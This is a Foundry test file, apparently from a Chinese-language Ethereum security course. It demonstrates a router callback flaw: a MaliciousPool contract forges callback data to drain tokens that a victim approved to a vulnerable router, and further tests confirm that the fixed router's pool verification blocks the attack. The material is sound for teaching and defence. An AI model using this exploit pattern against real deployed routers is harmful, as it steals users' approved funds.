// SPDX-License-Identifier: MIT
// 配套章节：C00 以太坊 4.7、05、07 ｜ 被测合约：code/snippets/08-RouterCallback.sol
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {VulnerableRouter, SafeRouter} from "snippets/08-RouterCallback.sol";
import {ToyERC20} from "../src/ToyERC20.sol";

interface ICallbackReceiver {
    function swapCallback(uint256 amountToPay, bytes calldata data) external;
}

/// @notice 恶意池子：伪造回调数据，把付款人换成受害者
contract MaliciousPool {
    ICallbackReceiver public immutable router;
    ToyERC20 public immutable token;
    address public immutable victim;

    constructor(ICallbackReceiver _router, ToyERC20 _token, address _victim) {
        router = _router;
        token = _token;
        victim = _victim;
    }

    function swap(address, bool, uint256, bytes calldata) external {
        strike();
    }

    function strike() public {
        router.swapCallback(token.balanceOf(victim), abi.encode(address(token), victim));
    }
}

/// @notice 诚实的玩具池：1:1 兑换。工厂用 CREATE2 部署，构造函数无参数。
contract ToyPool {
    address public immutable token0;
    address public immutable token1;

    constructor() {
        (token0, token1) = ToyFactory(msg.sender).params();
    }

    function swap(address recipient, bool zeroForOne, uint256 amountIn, bytes calldata data) external {
        ICallbackReceiver(msg.sender).swapCallback(amountIn, data);
        ToyERC20(zeroForOne ? token1 : token0).transfer(recipient, amountIn);
    }
}

contract ToyFactory {
    address public paramToken0;
    address public paramToken1;

    function params() external view returns (address, address) {
        return (paramToken0, paramToken1);
    }

    function create(address tokenA, address tokenB, uint24 fee) external returns (address pool) {
        (address t0, address t1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
        paramToken0 = t0;
        paramToken1 = t1;
        pool = address(new ToyPool{salt: keccak256(abi.encode(t0, t1, fee))}());
    }
}

contract RouterCallbackTest is Test {
    uint24 constant FEE = 3000;
    ToyERC20 tokenA;
    ToyERC20 tokenB;
    ToyFactory factory;
    address pool;
    VulnerableRouter vuln;
    SafeRouter safe;
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    function setUp() public {
        tokenA = new ToyERC20();
        tokenB = new ToyERC20();
        factory = new ToyFactory();
        pool = factory.create(address(tokenA), address(tokenB), FEE);
        tokenB.mint(pool, 1_000e18);
        vuln = new VulnerableRouter();
        safe = new SafeRouter(address(factory), keccak256(type(ToyPool).creationCode));
        tokenA.mint(victim, 100e18);
        vm.startPrank(victim);
        tokenA.approve(address(vuln), type(uint256).max);
        tokenA.approve(address(safe), type(uint256).max);
        vm.stopPrank();
    }

    function test_PoC_MaliciousPoolDrainsApprovedVictim() public {
        MaliciousPool evil = new MaliciousPool(ICallbackReceiver(address(vuln)), tokenA, victim);
        vm.prank(attacker);
        vuln.swapVia(address(evil), address(tokenA), 0);
        assertEq(tokenA.balanceOf(address(evil)), 100e18, "victim drained");
        assertEq(tokenA.balanceOf(victim), 0);
    }

    function test_Fixed_MaliciousPoolCallbackReverts() public {
        MaliciousPool evil = new MaliciousPool(ICallbackReceiver(address(safe)), tokenA, victim);
        vm.prank(attacker);
        vm.expectRevert("unknown pool");
        evil.strike();
        assertEq(tokenA.balanceOf(victim), 100e18);
    }

    function test_Fixed_PayerIsAlwaysTheSwapCaller() public {
        // 攻击者发起真实交换时，付款人是攻击者自己。没有余额就回滚。
        vm.prank(attacker);
        vm.expectRevert();
        safe.swapExact(address(tokenA), address(tokenB), FEE, 1e18);
        assertEq(tokenA.balanceOf(victim), 100e18);
    }

    function test_Fixed_HonestSwapStillWorks() public {
        vm.prank(victim);
        safe.swapExact(address(tokenA), address(tokenB), FEE, 10e18);
        assertEq(tokenB.balanceOf(victim), 10e18);
        assertEq(tokenA.balanceOf(pool), 10e18);
    }

    function test_Fixed_UndeployedPoolReverts() public {
        vm.prank(victim);
        vm.expectRevert();
        safe.swapExact(address(tokenA), address(tokenB), 500, 1e18); // 该费率没有部署池子
    }

    function testFuzz_NoCallerCanPullFromVictim(address caller, uint256 amount) public {
        vm.assume(caller != address(0));
        vm.prank(caller);
        vm.expectRevert("unknown pool");
        safe.swapCallback(amount, abi.encode(address(tokenA), victim));
        assertEq(tokenA.balanceOf(victim), 100e18);
    }
}
